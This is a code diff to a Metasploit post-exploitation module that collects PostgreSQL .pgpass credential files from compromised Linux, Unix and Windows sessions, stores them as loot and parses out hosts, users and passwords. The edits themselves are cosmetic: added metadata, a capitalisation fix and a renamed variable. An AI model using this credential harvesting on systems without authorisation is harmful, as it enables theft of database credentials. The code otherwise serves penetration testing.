@@ -20,7 +20,12 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => ['Zach Grace <zgrace[at]403labs.com>'],
         'Platform' => %w[linux bsd unix osx win],
-        'SessionTypes' => %w[meterpreter shell]
+        'SessionTypes' => %w[meterpreter shell],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
   end
@@ -34,7 +39,7 @@ class MetasploitModule < Msf::Post
       files = enum_user_directories.map { |d| d + '/.pgpass' }.select { |f| file?(f) }
     when 'windows'
       if session.type != 'meterpreter'
-        print_error('Only meterpreter sessions are supported on windows hosts')
+        print_error('Only meterpreter sessions are supported on Windows hosts')
         return
       end
 
@@ -58,21 +63,21 @@ class MetasploitModule < Msf::Post
       # Store the loot
       print_good("Downloading #{f}")
       pgpass_path = store_loot('postgres.pgpass', 'text/plain', session, read_file(f), f.to_s, "pgpass #{f} file")
-      print_good "Postgres credentials file saved to #{pgpass_path}"
+      print_good("Postgres credentials file saved to #{pgpass_path}")
       # Store the creds
       parse_creds(f)
     end
   end
 
   # Store the creds to
-  def parse_creds(f)
+  def parse_creds(fname)
     cred_table = Rex::Text::Table.new(
       'Header' => 'Postgres Data',
       'Indent' => 1,
       'Columns' => ['Host', 'Port', 'DB', 'User', 'Password']
     )
 
-    read_file(f).each_line do |entry|
+    read_file(fname).each_line do |entry|
       # skip comments
       next if entry.lstrip[0, 1] == '#'
 
